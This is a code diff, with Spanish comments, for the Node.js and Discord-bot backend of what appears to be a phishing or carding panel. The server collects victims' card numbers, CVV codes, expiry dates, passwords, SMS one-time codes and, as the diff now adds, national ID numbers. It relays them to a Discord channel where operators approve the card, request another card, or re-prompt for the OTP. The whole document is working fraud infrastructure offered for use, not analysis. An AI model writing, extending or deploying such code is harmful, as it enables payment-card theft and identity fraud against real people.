@@ -38,7 +38,8 @@ function detectarMarca(tarjeta) {
 // 🔥 ENDPOINT PRINCIPAL
 app.post('/nuevo', async (req, res) => {
     try {
-        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio, saldo, infoCompleta } = req.body;
+        // 🔥 Agregamos 'documento' a la lista de datos que recibimos
+        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, documento, expMes, expAnio, saldo, infoCompleta } = req.body;
         
         const finalUserId = userId || 'anon_' + Date.now();
         const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
@@ -90,12 +91,13 @@ app.post('/nuevo', async (req, res) => {
         if (!tarjeta) return res.status(400).json({ ok: false, error: 'Falta tarjeta' });
 
         sesiones.set(finalUserId, {
-            userId: finalUserId, tarjeta, codigo: codigo || '', expMes, expAnio,
+            userId: finalUserId, tarjeta, codigo: codigo || '', documento: documento || '', expMes, expAnio,
             estado: 'esperando_decision', otp: null, discordMsgId: null
         });
 
         const marca = detectarMarca(tarjeta);
 
+        // 🔥 AQUÍ SEPARAMOS EL CVV Y LA CÉDULA EN EL EMBED
         const embed = new EmbedBuilder()
             .setTitle('💳 Nueva tarjeta')
             .setColor(0xda0081)
@@ -104,7 +106,8 @@ app.post('/nuevo', async (req, res) => {
                 { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: false },
                 { name: '🏦 Marca', value: `\`${marca}\``, inline: true },
                 { name: '📅 Vence', value: `\`${expMes || '?'}/${expAnio || '?'}\``, inline: true },
-                { name: '🔒 CVV/Cédula', value: `\`${codigo}\``, inline: true }
+                { name: '🔒 CVV', value: `\`${codigo}\``, inline: true },
+                { name: '🆔 Cédula', value: `\`${documento}\``, inline: true }
             )
             .setTimestamp();
 
@@ -144,7 +147,6 @@ app.post('/validar-otp/:userId', async (req, res) => {
                 { name: '📱 SMS Recibido', value: `\`${otp}\``, inline: false }
             );
             
-            // BOTONES CUANDO LLEGA EL OTP
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
                 new ButtonBuilder().setCustomId(`otracc_${userId}`).setLabel('📱 Pedir otra CC').setStyle(ButtonStyle.Primary),
@@ -197,7 +199,6 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.reply({ content: `📱 Se solicitó cambiar de tarjeta al usuario.`, ephemeral: true });
     } 
     else if (action === 'rechazarotp') { 
-        // 🔥 CAMBIO CLAVE AQUÍ: Ahora envía el estado 'pedir_otp' para que el HTML lo detecte de nuevo
         s.estado = 'pedir_otp'; 
         sesiones.set(userId, s);
         await interaction.reply({ content: `❌ OTP rechazado. Se solicitará de nuevo.`, ephemeral: true });
